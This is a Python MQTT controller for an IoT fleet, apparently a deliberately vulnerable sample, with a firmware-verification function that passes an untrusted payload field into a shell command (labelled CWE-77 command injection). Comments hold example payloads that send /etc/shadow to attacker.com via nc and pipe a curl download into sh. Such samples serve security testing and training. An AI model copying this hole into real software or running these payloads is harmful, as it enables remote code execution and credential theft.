import os
import json
import uuid
import sqlite3
import logging
import subprocess
import paho.mqtt.client as mqtt
from datetime import datetime

# Configure logging for the IoT Fleet Management Agent
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - IoTAgent - %(levelname)s - %(message)s'
)
logger = logging.getLogger("MQTT_Controller")

DB_FILE = "iot_operations.db"
MQTT_BROKER = os.getenv("MQTT_BROKER", "localhost")
MQTT_PORT = 1883
COMMAND_TOPIC = "iot/fleet/+/commands"

def init_operations_db():
    """Initializes the SQLite database to track remote IoT device commands."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE command_logs (
            request_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            device_id TEXT NOT NULL,
            action TEXT NOT NULL,
            status TEXT NOT NULL,
            details TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('req_111', 'dev_alpha', 'reboot', 'SUCCESS', 'Device rebooted normally.'),
        ('req_222', 'dev_beta', 'update', 'FAILED', 'Download timed out.')
    ]
    cursor.executemany('''
        INSERT INTO command_logs (request_id, device_id, action, status, details)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("IoT operations database initialized.")

def log_operation(request_id: str, device_id: str, action: str, status: str, details: str):
    """Records the outcome of a remote MQTT command."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO command_logs (request_id, device_id, action, status, details) VALUES (?, ?, ?, ?, ?)",
            (request_id, device_id, action, status, details)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging operation {request_id}: {e}")

def verify_firmware_signature(firmware_version: str, request_id: str) -> str:
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: MQTT Topic Payload (JSON 'firmware_version' field)
    """
    logger.info(f"[{request_id}] Initiating signature verification for firmware: {firmware_version}")
    
    # Vulnerability: Direct string interpolation of the MQTT JSON field into a shell command.
    # The 'firmware_version' is extracted directly from the unvalidated MQTT payload.
    # Passing this untrusted data to shell=True allows arbitrary command execution.
    command = f"gpg --verify /var/iot/firmware/{firmware_version}.sig /var/iot/firmware/{firmware_version}.bin"
    
    try:
        logger.debug(f"[{request_id}] Executing cryptographic verification command: {command}")
        
        # shell=True processes shell metacharacters. An attacker publishing to the MQTT topic
        # can inject a payload like: "firmware_version": "v1.0; cat /etc/shadow | nc attacker.com 1337; #"
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=45)
        
        if process.returncode == 0:
            logger.info(f"[{request_id}] Firmware {firmware_version} signature is valid.")
            return "VALID"
        else:
            logger.warning(f"[{request_id}] Firmware signature invalid. Output: {stderr.strip()}")
            # Leaking the stderr allows the attacker to see the output of their injected commands
            # if this data is synchronized back to a central dashboard.
            return f"INVALID: {stderr.strip()}"
            
    except subprocess.TimeoutExpired:
        logger.error(f"[{request_id}] Verification process timed out.")
        return "TIMEOUT"
    except Exception as e:
        logger.error(f"[{request_id}] System error during verification: {e}")
        return f"ERROR: {str(e)}"

def on_connect(client, userdata, flags, rc):
    """Callback for when the client receives a CONNACK response from the server."""
    if rc == 0:
        logger.info(f"Connected successfully to MQTT Broker at {MQTT_BROKER}")
        client.subscribe(COMMAND_TOPIC)
        logger.info(f"Subscribed to control topic: {COMMAND_TOPIC}")
    else:
        logger.error(f"Failed to connect to MQTT broker, return code {rc}")

def on_message(client, userdata, msg):
    """Callback for when a PUBLISH message is received from the server."""
    topic = msg.topic
    logger.info(f"Received message on topic: {topic}")
    
    # Extract device_id from topic (e.g., iot/fleet/device_123/commands)
    try:
        device_id = topic.split('/')[2]
    except IndexError:
        device_id = "unknown_device"
        
    request_id = f"req_{uuid.uuid4().hex[:8]}"
    
    try:
        payload = json.loads(msg.payload.decode('utf-8'))
        action = payload.get("action")
        
        if action == "verify_firmware":
            firmware_version = payload.get("firmware_version")
            if not firmware_version:
                logger.warning(f"[{request_id}] Missing 'firmware_version' in payload.")
                return
                
            logger.info(f"[{request_id}] Processing firmware verification for {device_id}")
            
            # Pass the untrusted field from the MQTT message to the vulnerable function
            result = verify_firmware_signature(firmware_version, request_id)
            
            status = "SUCCESS" if result == "VALID" else "FAILED"
            log_operation(request_id, device_id, action, status, result)
            
        elif action == "ping":
            logger.info(f"[{request_id}] Device {device_id} responded to ping.")
            log_operation(request_id, device_id, action, "SUCCESS", "Ping acknowledged.")
        else:
            logger.warning(f"[{request_id}] Unknown action '{action}' for device {device_id}.")
            
    except json.JSONDecodeError:
        logger.error(f"[{request_id}] Malformed JSON payload received on {topic}")
        log_operation(request_id, device_id, "unknown", "ERROR", "Invalid JSON format")
    except Exception as e:
        logger.error(f"[{request_id}] Unexpected error processing message: {e}")

def start_mqtt_client():
    """Configures and starts the Paho MQTT client loop."""
    init_operations_db()
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    
    try:
        client.connect(MQTT_BROKER, MQTT_PORT, 60)
    except Exception as e:
        logger.error(f"Could not connect to MQTT broker: {e}")
        return
        
    # Example Malicious Trigger (published by an attacker via mosquitto_pub):
    # mosquitto_pub -h localhost -t "iot/fleet/dev_001/commands" -m '{"action": "verify_firmware", "firmware_version": "v1.2.3.bin; curl http://attacker.com/malware.sh | sh; #"}'
    
    logger.info("Starting MQTT network loop...")
    client.loop_forever()

if __name__ == "__main__":
    start_mqtt_client()
